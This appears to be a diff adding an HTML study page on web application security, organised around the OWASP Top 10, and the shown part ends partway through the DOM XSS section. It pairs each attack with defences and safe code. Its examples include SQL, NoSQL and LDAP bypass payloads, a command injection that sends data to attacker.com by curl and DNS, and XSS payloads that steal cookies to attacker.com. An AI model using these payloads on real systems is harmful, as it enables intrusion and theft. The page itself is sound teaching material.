@@ -1,0 +1,1370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web Application Security — OWASP & AppSec Reference</title>
+<style>
+  :root {
+    --bg: #0a0e17;
+    --surface: #131925;
+    --surface2: #1a2233;
+    --border: #2a3444;
+    --accent: #00d4aa;
+    --accent2: #7c5cfc;
+    --accent3: #ff6b6b;
+    --accent4: #ffd93d;
+    --text: #e0e6ed;
+    --text-dim: #8892a4;
+    --text-bright: #ffffff;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif; background: var(--bg); color: var(--text); line-height: 1.7; overflow-x: hidden; }
+
+  nav { position: fixed; top: 0; left: 0; width: 260px; height: 100vh; background: var(--surface); border-right: 1px solid var(--border); padding: 24px 0; overflow-y: auto; z-index: 100; }
+  nav h2 { font-size: 14px; text-transform: uppercase; letter-spacing: 2px; color: var(--accent); padding: 0 20px; margin-bottom: 20px; }
+  nav a { display: block; padding: 10px 20px; color: var(--text-dim); text-decoration: none; font-size: 14px; border-left: 3px solid transparent; transition: all 0.2s; }
+  nav a:hover, nav a.active { color: var(--text-bright); background: rgba(0,212,170,0.05); border-left-color: var(--accent); }
+  nav .section-label { font-size: 11px; text-transform: uppercase; letter-spacing: 1.5px; color: var(--text-dim); padding: 16px 20px 6px; opacity: 0.6; }
+
+  main { margin-left: 260px; max-width: 900px; padding: 40px 60px 100px; }
+  h1 { font-size: 42px; font-weight: 800; background: linear-gradient(135deg, var(--accent), var(--accent2)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 8px; }
+  .subtitle { font-size: 18px; color: var(--text-dim); margin-bottom: 48px; }
+  h2 { font-size: 28px; font-weight: 700; color: var(--text-bright); margin-top: 64px; margin-bottom: 24px; padding-top: 20px; border-top: 1px solid var(--border); }
+  h3 { font-size: 20px; font-weight: 600; color: var(--accent); margin-top: 32px; margin-bottom: 12px; }
+  h4 { font-size: 16px; font-weight: 600; color: var(--accent2); margin-top: 24px; margin-bottom: 8px; }
+  p { margin-bottom: 16px; }
+  a { color: var(--accent); }
+  code { background: var(--surface2); padding: 2px 7px; border-radius: 4px; font-family: 'JetBrains Mono','Fira Code',monospace; font-size: 14px; color: var(--accent4); }
+  pre { background: var(--surface2); border: 1px solid var(--border); border-radius: 8px; padding: 20px; overflow-x: auto; font-family: 'JetBrains Mono','Fira Code',monospace; font-size: 13px; line-height: 1.6; margin: 16px 0; color: var(--text); }
+
+  .info-box { border-radius: 8px; padding: 16px 20px; margin: 16px 0; font-size: 14px; }
+  .info-box.warning { background: rgba(255,107,107,0.1); border-left: 3px solid var(--accent3); }
+  .info-box.note { background: rgba(0,212,170,0.08); border-left: 3px solid var(--accent); }
+  .info-box.key { background: rgba(124,92,252,0.1); border-left: 3px solid var(--accent2); }
+  .info-box strong { color: var(--text-bright); }
+
+  table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 14px; }
+  th { background: var(--surface2); padding: 12px 16px; text-align: left; font-weight: 600; color: var(--accent); border-bottom: 2px solid var(--border); }
+  td { padding: 10px 16px; border-bottom: 1px solid var(--border); }
+  tr:hover td { background: rgba(0,212,170,0.03); }
+
+  ul, ol { margin: 0 0 16px 24px; }
+  li { margin-bottom: 6px; }
+
+  .defence-list { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 16px 20px; margin: 16px 0; }
+  .defence-list h4 { margin-top: 0; color: var(--accent); }
+  .defence-list li { font-size: 14px; }
+  .defence-list li::marker { color: var(--accent); }
+
+  .refs { background: var(--surface2); border: 1px solid var(--border); border-radius: 8px; padding: 14px 18px; margin: 20px 0 8px; font-size: 13px; }
+  .refs-title { font-size: 11px; text-transform: uppercase; letter-spacing: 1.5px; color: var(--text-dim); margin-bottom: 10px; }
+  .refs-row { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; margin-bottom: 6px; }
+  .refs-label { color: var(--text-dim); font-size: 12px; min-width: 60px; }
+  .refs-row a { color: var(--accent); text-decoration: none; padding: 2px 8px; border: 1px solid rgba(0,212,170,0.25); border-radius: 4px; font-size: 12px; transition: all 0.15s; }
+  .refs-row a:hover { background: rgba(0,212,170,0.1); }
+  .refs-row a.community { color: var(--accent2); border-color: rgba(124,92,252,0.3); }
+  .refs-row a.community:hover { background: rgba(124,92,252,0.1); }
+
+  .attack-box { background: rgba(255,107,107,0.06); border: 1px solid rgba(255,107,107,0.2); border-radius: 8px; padding: 16px 20px; margin: 16px 0; }
+  .attack-box .attack-label { font-size: 11px; text-transform: uppercase; letter-spacing: 1.5px; color: var(--accent3); margin-bottom: 8px; font-weight: 600; }
+
+  @media (max-width: 900px) { nav { display: none; } main { margin-left: 0; padding: 24px 20px; } h1 { font-size: 30px; } }
+</style>
+</head>
+<body>
+
+<nav>
+  <h2>Contents</h2>
+
+  <div style="padding:10px 14px 14px; border-bottom:1px solid var(--border); margin-bottom:10px;">
+    <div style="font-size:10px;text-transform:uppercase;letter-spacing:1.5px;color:var(--text-dim);margin-bottom:8px;">Site</div>
+    <a href="tls-cryptographic-engineering-guide.html" style="display:flex;align-items:center;gap:8px;padding:7px 10px;background:rgba(0,212,170,0.08);border:1px solid rgba(0,212,170,0.25);border-radius:7px;color:var(--accent);text-decoration:none;font-size:12px;margin-bottom:6px;transition:all 0.15s;" onmouseover="this.style.background='rgba(0,212,170,0.16)'" onmouseout="this.style.background='rgba(0,212,170,0.08)'">
+      <span style="font-size:16px;">📖</span>
+      <div><div style="font-weight:700;">TLS &amp; Crypto Guide</div><div style="font-size:10px;opacity:0.7;">Full cryptographic reference</div></div>
+    </a>
+    <a href="browser-security.html" style="display:flex;align-items:center;gap:8px;padding:7px 10px;background:rgba(124,92,252,0.08);border:1px solid rgba(124,92,252,0.25);border-radius:7px;color:var(--accent2);text-decoration:none;font-size:12px;margin-bottom:6px;transition:all 0.15s;" onmouseover="this.style.background='rgba(124,92,252,0.16)'" onmouseout="this.style.background='rgba(124,92,252,0.08)'">
+      <span style="font-size:16px;">🛡️</span>
+      <div><div style="font-weight:700;">Browser Security</div><div style="font-size:10px;opacity:0.7;">SOP, CORS, CSP, cookies &amp; more</div></div>
+    </a>
+    <a href="crypto-study-notes.html" style="display:flex;align-items:center;gap:8px;padding:7px 10px;background:rgba(255,217,61,0.08);border:1px solid rgba(255,217,61,0.25);border-radius:7px;color:var(--accent4);text-decoration:none;font-size:12px;margin-bottom:6px;transition:all 0.15s;" onmouseover="this.style.background='rgba(255,217,61,0.16)'" onmouseout="this.style.background='rgba(255,217,61,0.08)'">
+      <span style="font-size:16px;">📝</span>
+      <div><div style="font-weight:700;">Study Notes</div><div style="font-size:10px;opacity:0.7;">Active learning tracker</div></div>
+    </a>
+    <a href="crypto-mind-map.html" style="display:flex;align-items:center;gap:8px;padding:7px 10px;background:rgba(255,107,107,0.08);border:1px solid rgba(255,107,107,0.25);border-radius:7px;color:var(--accent3);text-decoration:none;font-size:12px;transition:all 0.15s;" onmouseover="this.style.background='rgba(255,107,107,0.16)'" onmouseout="this.style.background='rgba(255,107,107,0.08)'">
+      <span style="font-size:16px;">🗺️</span>
+      <div><div style="font-weight:700;">Mind Map</div><div style="font-size:10px;opacity:0.7;">Interactive concept map</div></div>
+    </a>
+  </div>
+
+  <div class="section-label">OWASP &amp; Overview</div>
+  <a href="#owasp-overview">OWASP Top 10 Overview</a>
+
+  <div class="section-label">Injection</div>
+  <a href="#sqli">SQL Injection</a>
+  <a href="#nosqli">NoSQL Injection</a>
+  <a href="#cmdi">Command Injection</a>
+  <a href="#ldap-inject">LDAP Injection</a>
+  <a href="#xpath-inject">XPath Injection</a>
+
+  <div class="section-label">Client-Side Attacks</div>
+  <a href="#xss-reflected">Reflected XSS</a>
+  <a href="#xss-stored">Stored XSS</a>
+  <a href="#xss-dom">DOM-Based XSS</a>
+  <a href="#xss-mxss">Mutation XSS (mXSS)</a>
+  <a href="#csrf">CSRF &amp; SameSite</a>
+  <a href="#clickjacking-appsec">Clickjacking</a>
+
+  <div class="section-label">Authentication &amp; Access</div>
+  <a href="#broken-auth">Broken Authentication</a>
+  <a href="#idor">IDOR &amp; Broken Access Control</a>
+
+  <div class="section-label">Configuration &amp; Components</div>
+  <a href="#security-misconfig">Security Misconfiguration</a>
+  <a href="#vuln-deps">Vulnerable Dependencies</a>
+
+  <div class="section-label">Advanced Vulnerabilities</div>
+  <a href="#xxe">XXE Injection</a>
+  <a href="#ssrf">Server-Side Request Forgery</a>
+  <a href="#deserialize">Insecure Deserialization</a>
+  <a href="#file-upload">File Upload Attacks</a>
+  <a href="#business-logic">Business Logic Flaws</a>
+
+  <div class="section-label">Defence Infrastructure</div>
+  <a href="#rate-limiting">Rate Limiting &amp; Throttling</a>
+  <a href="#http-headers">HTTP Security Headers</a>
+</nav>
+
+<main>
+
+  <h1 id="owasp-top10">Web Application Security</h1>
+  <p class="subtitle">OWASP Top 10, injection attacks, XSS, CSRF, and defence patterns</p>
+  <p>Web application security covers the vulnerabilities introduced by the application layer — the code you write, the libraries you depend on, and the configuration you deploy. Unlike network or cryptographic attacks, most web vulnerabilities require little more than a browser and knowledge of HTTP.</p>
+  <p>This guide follows the <strong>OWASP Top 10 (2021)</strong> as its backbone, then goes deeper into attack mechanics, real exploitation patterns, and concrete defences with code examples.</p>
+
+  <!-- ============================================================ -->
+  <h2 id="owasp-overview">OWASP Top 10 Overview</h2>
+
+  <p>The OWASP Top 10 is the de-facto standard awareness document for web application security risks. It is compiled from survey data, CVE databases, and contributions from hundreds of security organisations worldwide. Updated roughly every four years, it reflects the most critical risk categories affecting real applications in production.</p>
+
+  <table>
+    <thead>
+      <tr><th>ID</th><th>Name</th><th>Root Cause</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>A01:2021</td><td>Broken Access Control</td><td>Missing authorization checks; IDOR; path traversal</td></tr>
+      <tr><td>A02:2021</td><td>Cryptographic Failures</td><td>Weak ciphers; plaintext secrets; no TLS; weak hashing</td></tr>
+      <tr><td>A03:2021</td><td>Injection</td><td>Untrusted data sent to an interpreter (SQL, OS, LDAP, XML)</td></tr>
+      <tr><td>A04:2021</td><td>Insecure Design</td><td>Missing threat models; no secure design patterns</td></tr>
+      <tr><td>A05:2021</td><td>Security Misconfiguration</td><td>Default creds; open cloud storage; verbose errors; unnecessary features</td></tr>
+      <tr><td>A06:2021</td><td>Vulnerable &amp; Outdated Components</td><td>Dependencies with known CVEs; unpatched OS/frameworks</td></tr>
+      <tr><td>A07:2021</td><td>Identification &amp; Auth Failures</td><td>Credential stuffing; weak passwords; broken session management</td></tr>
+      <tr><td>A08:2021</td><td>Software &amp; Data Integrity Failures</td><td>Insecure deserialization; CI/CD without integrity checks</td></tr>
+      <tr><td>A09:2021</td><td>Security Logging &amp; Monitoring Failures</td><td>No audit log; no alerting; breaches undetected for months</td></tr>
+      <tr><td>A10:2021</td><td>Server-Side Request Forgery</td><td>Server fetches attacker-controlled URL; exposes internal services</td></tr>
+    </tbody>
+  </table>
+
+  <div class="info-box note">
+    <strong>A01 moved from #5 to #1:</strong> A01 (Broken Access Control) moved from #5 in 2017 to #1 in 2021, reflecting how prevalent missing authorization checks have become — 94% of applications tested had some form of broken access control.
+  </div>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/Top10/" target="_blank">owasp.org/Top10</a>
+      <a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top Ten Project</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://portswigger.net/web-security" target="_blank" class="community">PortSwigger Web Security</a>
+      <a href="https://book.hacktricks.xyz/pentesting-web/web-vulnerabilities-methodology" target="_blank" class="community">HackTricks Methodology</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="sqli">SQL Injection</h2>
+
+  <p>SQL injection (SQLi) occurs when user-supplied input is concatenated directly into a SQL query string. The database interpreter cannot distinguish between the intended query structure and the injected SQL, so it executes attacker-controlled commands. It is one of the oldest and most well-understood vulnerabilities, yet it continues to appear in production systems worldwide.</p>
+
+  <p>There are three main categories: <strong>in-band SQLi</strong> (results returned directly in the HTTP response), <strong>blind SQLi</strong> (no direct output — attackers infer data via boolean conditions or time delays), and <strong>out-of-band SQLi</strong> (data exfiltrated via DNS lookups or HTTP requests initiated by the database server).</p>
+
+  <p>SQLi can lead to authentication bypass, full database dump, file read/write on the server filesystem, and in some configurations (e.g., MySQL with FILE privilege, SQL Server with xp_cmdshell) — remote code execution.</p>
+
+  <div class="attack-box">
+    <div class="attack-label">Attack Example</div>
+    <pre>-- Vulnerable query
+SELECT * FROM users WHERE username = '$input' AND password = '$pass'
+
+-- Input: ' OR '1'='1'--
+-- Resulting query (always true — the -- comments out the password check):
+SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = ''
+
+-- Union-based extraction (get DB version):
+' UNION SELECT null, version(), null--
+
+-- Blind boolean (infer data one bit at a time):
+' AND SUBSTRING(password,1,1)='a'--
+
+-- Time-based blind (no output channel):
+'; IF (1=1) WAITFOR DELAY '0:0:5'--</pre>
+  </div>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li>Use parameterised queries / prepared statements — the ONLY reliable fix</li>
+      <li>ORMs (SQLAlchemy, Hibernate, ActiveRecord) use parameterised queries by default — don't bypass with raw string interpolation</li>
+      <li>Input validation as defence-in-depth (never the primary fix)</li>
+      <li>Principle of least privilege for DB accounts — app account should not have DROP/ALTER</li>
+      <li>WAF as a supplementary layer, not a replacement for parameterisation</li>
+      <li>Use <code>sqlmap</code> in CI to test for SQLi on staging environments</li>
+    </ul>
+  </div>
+
+  <pre><span style="color:var(--accent3)"># VULNERABLE</span>
+cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
+
+<span style="color:var(--accent)"># SAFE — parameterised</span>
+cursor.execute("SELECT * FROM users WHERE username = %s", (username,))</pre>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP SQLi</a>
+      <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank">Prevention Cheat Sheet</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://portswigger.net/web-security/sql-injection" target="_blank" class="community">PortSwigger SQLi</a>
+      <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection" target="_blank" class="community">HackTricks SQLi</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="nosqli">NoSQL Injection</h2>
+
+  <p>NoSQL databases (MongoDB, CouchDB, Redis) use structured query objects rather than SQL strings, but they are still vulnerable when user input is inserted into query operators without type validation. MongoDB's <code>$where</code>, <code>$regex</code>, <code>$gt</code>, and <code>$ne</code> operators are commonly abused to bypass authentication or extract data.</p>
+
+  <p>Unlike SQLi, there is no universal "parameterised query" equivalent for all NoSQL databases. The primary defence is strict input type validation — rejecting objects and arrays where primitive strings are expected — combined with schema-enforcing ODMs.</p>
+
+  <div class="attack-box">
+    <div class="attack-label">Attack Example</div>
+    <pre>// Vulnerable Express + MongoDB login
+const user = await db.collection('users').findOne({
+  username: req.body.username,
+  password: req.body.password
+});
+
+// Attacker sends JSON body: {"username": "admin", "password": {"$ne": ""}}
+// MongoDB query becomes: { username: "admin", password: { $ne: "" } }
+// $ne: "" means "password not equal to empty string" — always true for any real password
+// Result: login bypassed
+
+// $where JavaScript injection (if enabled):
+// {"username": "admin", "$where": "sleep(5000)"}</pre>
+  </div>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li>Validate and sanitise input type — reject objects where strings are expected</li>
+      <li>Use an ODM (Mongoose) with strict schema validation</li>
+      <li>Disable the <code>$where</code> operator in MongoDB config</li>
+      <li>Escape or reject <code>$</code> and <code>.</code> prefixes in user-supplied keys</li>
+    </ul>
+  </div>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection" target="_blank">OWASP WSTG NoSQLi</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://portswigger.net/web-security/nosql-injection" target="_blank" class="community">PortSwigger NoSQLi</a>
+      <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection" target="_blank" class="community">HackTricks NoSQLi</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="cmdi">Command Injection</h2>
+
+  <p>Command injection occurs when user input is passed to a shell command without proper sanitisation. Shell metacharacters — <code>;</code>, <code>&amp;&amp;</code>, <code>|</code>, <code>``</code>, <code>$()</code> — allow attackers to append or substitute arbitrary commands, which execute with the same privileges as the web application process.</p>
+
+  <p>Even applications that attempt to sanitise input often fail against edge cases: URL-encoded characters, Unicode homoglyphs, newline characters, or environment variable expansion. The only reliable fix is to never pass user input to a shell interpreter at all.</p>
+
+  <div class="attack-box">
+    <div class="attack-label">Attack Example</div>
+    <pre>// Vulnerable Python (os.system with user input)
+import os
+filename = request.args.get('file')
+os.system(f"convert {filename} output.png")
+
+# Attacker input: "image.png; curl http://attacker.com/$(whoami)"
+# Executed: convert image.png; curl http://attacker.com/root
+
+# Blind exfiltration via DNS:
+# "; nslookup $(cat /etc/passwd | base64 | head -c 30).attacker.com"
+
+# Common injection chars: ; | &amp;&amp; || ` $() { } &lt; &gt; newline</pre>
+  </div>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li>Never pass user input to shell functions (<code>os.system</code>, <code>exec</code>, <code>shell_exec</code>, <code>popen</code>)</li>
+      <li>Use language-native APIs: <code>subprocess.run([...], shell=False)</code> in Python — pass arguments as a list, not a string</li>
+      <li>Allowlist: validate input against a strict pattern before any system call</li>
+      <li>Drop shell privileges; run workers as a non-root user</li>
+    </ul>
+  </div>
+
+  <pre><span style="color:var(--accent)"># SAFE — no shell, arguments as list</span>
+import subprocess
+result = subprocess.run(
+    ["convert", filename, "output.png"],
+    shell=False, capture_output=True, timeout=10
+)</pre>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/www-community/attacks/Command_Injection" target="_blank">OWASP Command Injection</a>
+      <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" target="_blank">Defense Cheat Sheet</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://portswigger.net/web-security/os-command-injection" target="_blank" class="community">PortSwigger CMDi</a>
+      <a href="https://book.hacktricks.xyz/pentesting-web/command-injection" target="_blank" class="community">HackTricks CMDi</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="ldap-inject">LDAP Injection</h2>
+
+  <p>LDAP (Lightweight Directory Access Protocol) is commonly used for authentication and directory lookups against systems like Active Directory and OpenLDAP. LDAP filters are constructed from user input to find users, groups, or attributes. Special characters in LDAP filter syntax — <code>(</code>, <code>)</code>, <code>*</code>, <code>\</code>, <code>NUL</code> — can change query logic when inserted unescaped.</p>
+
+  <p>LDAP injection can lead to authentication bypass, user enumeration, and in some configurations disclosure of sensitive directory attributes such as password hashes or group memberships.</p>
+
+  <div class="attack-box">
+    <div class="attack-label">Attack Example</div>
+    <pre># Vulnerable LDAP filter for login:
+(&amp;(uid=INPUT)(userPassword=PASS))
+
+# Attacker input for uid: admin)(|(uid=*
+# Resulting filter:
+(&amp;(uid=admin)(|(uid=*)(userPassword=PASS))
+# The (uid=*) always matches — login bypassed
+
+# Wildcard search bypass:
+# uid=* returns all users</pre>
+  </div>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li>Escape LDAP special characters in input: <code>(</code>, <code>)</code>, <code>\</code>, <code>*</code>, <code>NUL</code>, <code>/</code></li>
+      <li>Use an LDAP library that supports parameterised filters</li>
+      <li>Enforce input allowlisting (alphanumeric + limited chars for usernames)</li>
+    </ul>
+  </div>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/www-community/attacks/LDAP_Injection" target="_blank">OWASP LDAP Injection</a>
+      <a href="https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html" target="_blank">Prevention Cheat Sheet</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://book.hacktricks.xyz/pentesting-web/ldap-injection" target="_blank" class="community">HackTricks LDAP Injection</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="xpath-inject">XPath Injection</h2>
+
+  <p>XPath is used to query XML documents. When user input is concatenated into an XPath expression, attackers can alter the query logic — similar to SQL injection but targeting XML data stores. XPath injection is commonly found in applications that use XML-based configuration, authentication backends, or data exchange formats.</p>
+
+  <p>XPath 1.0 (the most common version) does not support parameterised queries natively, making escaping and strict input validation the primary mitigations.</p>
+
+  <div class="attack-box">
+    <div class="attack-label">Attack Example</div>
+    <pre>// Vulnerable: login checks XML user store
+string(//user[name/text()='INPUT' and password/text()='PASS']/account/text())
+
+// Attacker input: ' or '1'='1
+// Query becomes always-true, returns first account
+string(//user[name/text()='' or '1'='1' and password/text()='PASS']/account/text())
+
+// Full data extraction via blind technique:
+// ' or substring(//user[1]/password,1,1)='a</pre>
+  </div>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li>Use parameterised XPath expressions where supported (XPath 2.0+ or library-level)</li>
+      <li>Escape <code>'</code>, <code>"</code>, <code>/</code>, <code>\</code>, <code>[</code>, <code>]</code> in input</li>
+      <li>Prefer DOM-based XML APIs over raw XPath when querying user-derived paths</li>
+    </ul>
+  </div>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/www-community/attacks/XPATH_Injection" target="_blank">OWASP XPath Injection</a>
+      <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html" target="_blank">XML Security Cheat Sheet</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://book.hacktricks.xyz/pentesting-web/xpath-injection" target="_blank" class="community">HackTricks XPath Injection</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="xss-reflected">Reflected XSS</h2>
+
+  <p>Reflected XSS occurs when user-supplied input is immediately returned in the server's HTTP response without proper encoding. The payload is not stored — it lives in a crafted URL. The attacker tricks the victim into clicking the link (via phishing email, social media, or QR code), and the browser executes the injected script in the context of the target origin.</p>
+
+  <p>Because the payload is reflected in the response, reflected XSS is sometimes called "non-persistent" XSS. Each attack requires the victim to visit the crafted URL, which means it requires social engineering per victim — but it can still steal session cookies, perform actions as the victim, or redirect to phishing pages.</p>
+
+  <div class="attack-box">
+    <div class="attack-label">Attack Example</div>
+    <pre>&lt;!-- Vulnerable: server renders input directly --&gt;
+&lt;p&gt;Search results for: &lt;?= $_GET['q'] ?&gt;&lt;/p&gt;
+
+&lt;!-- Attacker URL:
+https://example.com/search?q=&lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;
+--&gt;
+
+&lt;!-- Rendered HTML:
+&lt;p&gt;Search results for: &lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;&lt;/p&gt;
+--&gt;</pre>
+  </div>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li>HTML-encode all output: <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>"</code>, <code>'</code> → <code>&amp;amp;</code>, <code>&amp;lt;</code>, <code>&amp;gt;</code>, <code>&amp;quot;</code>, <code>&amp;#x27;</code></li>
+      <li>Use framework auto-escaping (Jinja2, React JSX, Angular templates all escape by default — never use <code>dangerouslySetInnerHTML</code> or <code>|safe</code> with user input)</li>
+      <li>Set <code>Content-Type: text/html; charset=utf-8</code> — ambiguous charset can enable XSS</li>
+      <li>Deploy a <code>Content-Security-Policy</code> header (see HTTP Headers section)</li>
+      <li>Mark cookies <code>HttpOnly</code> to prevent exfiltration even if XSS fires</li>
+    </ul>
+  </div>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP XSS</a>
+      <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">XSS Prevention Cheat Sheet</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank" class="community">PortSwigger Reflected XSS</a>
+      <a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting" target="_blank" class="community">HackTricks XSS</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="xss-stored">Stored XSS</h2>
+
+  <p>Stored (persistent) XSS saves the payload in the application's data store — a database, log file, comment system, or user profile. Every user who subsequently views the affected page executes the script. Unlike reflected XSS, no social engineering is required per victim — the attacker injects once and harvests many sessions.</p>
+
+  <p>Stored XSS is particularly dangerous in admin panels (compromise admin → full application takeover), comment sections on high-traffic pages, and anywhere user-generated content is rendered for other users. The impact scales with the number of viewers.</p>
+
+  <div class="attack-box">
+    <div class="attack-label">Attack Example</div>
+    <pre>&lt;!-- Attacker submits a comment: --&gt;
+&lt;script&gt;
+  // Exfiltrate all cookies to attacker C2
+  new Image().src = 'https://attacker.com/x?c=' + encodeURIComponent(document.cookie);
+  // Or: silently post as the victim
+  fetch('/api/transfer', {method:'POST', body:'amount=10000&amp;to=attacker', credentials:'include'});
+&lt;/script&gt;
+
+&lt;!-- Stored in DB, rendered to every visitor:
+&lt;div class="comment"&gt;
+  &lt;script&gt;new Image().src = 'https://attacker.com/x?c=...'&lt;/script&gt;
+&lt;/div&gt;
+--&gt;</pre>
+  </div>
+
+  <p>All defences from Reflected XSS apply, plus: store raw text in the database and encode at render time (never the reverse). Use a strict HTML sanitiser (DOMPurify) only if rich HTML input is genuinely required by the feature.</p>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/www-community/attacks/xss/#stored-xss-attacks" target="_blank">OWASP Stored XSS</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://portswigger.net/web-security/cross-site-scripting/stored" target="_blank" class="community">PortSwigger Stored XSS</a>
+      <a href="https://github.com/cure53/DOMPurify" target="_blank" class="community">DOMPurify</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="xss-dom">DOM-Based XSS</h2>
+
+  <p>DOM XSS occurs entirely client-side. The server's HTTP response is safe — no attacker payload is present in the initial HTML. Instead, JavaScript running on the page reads from a dangerous <strong>source</strong> (URL hash, <code>document.referrer</code>, <code>localStorage</code>, <code>postMessage</code> data) and writes it to a dangerous <strong>sink</strong> (<code>innerHTML</code>, <code>eval</code>, <code>document.write</code>, <code>setTimeout</code> with a string argument).</p>
+
+  <p>DOM XSS is harder to detect with server-side scanning tools because the vulnerability lives in JavaScript. Browser DevTools and tools like DOM Invader (Burp Suite) are needed to trace source-to-sink data flows in client-side code.</p>
+
+  <div class="attack-box">
+    <div class="attack-label">Attack Example</div>
+    <pre>// Vulnerable: reads hash fragment, writes to DOM without encoding
+const name = decodeURIComponent(location.hash.slice(1));
+document.getElementById('welcome').innerHTML = 'Hello, ' + name;
+
+// Attack URL: https://example.com/page#&lt;img src=x onerror=alert(1)&gt;
+// No server involved — the browser itself executes the XSS
+
+// Common dangerous sinks:
+// element.innerHTML, element.outerHTML
+// document.write(), document.writeln()
+// eval(), setTimeout("string"), setInterval("string")
+// location.href = "javascript:..."
+// jQuery: $(...).html(), $.globalEval()</pre>
+  </div>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li>Avoid <code>innerHTML</code> — use <code>textContent</code> or <code>innerText</code> for text content</li>
+      <li>Use <code>element.setAttribute()</code> rather than <code>element.href = userInput</code> — but note: <code>setAttribute('href', userInput)</code> is <strong>not safe for URL attributes on its own</strong>. An attacker can still pass <code>javascript:alert(1)</code> and the browser will execute it. For URL attributes, always validate that the scheme is <code>http:</code> or <code>https:</code> before assigning (e.g., parse with <code>new URL()</code> and check <code>.protocol</code>), then assign the validated value.</li>
+      <li>Enable Trusted Types CSP policy to enforce safe DOM manipulation</li>
+    </ul>
+  </div>
+
+  <pre><span style="color:var(--accent)"># SAFE</span>
+document.getElementById('welcome').textContent = 'Hello, ' + name;</pre>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/www-community/attacks/DOM_Based_XSS" target="_blank">OWASP DOM XSS</a>
+      <a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html" target="_blank">DOM XSS Prevention</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based" target="_blank" class="community">PortSwigger DOM XSS</a>
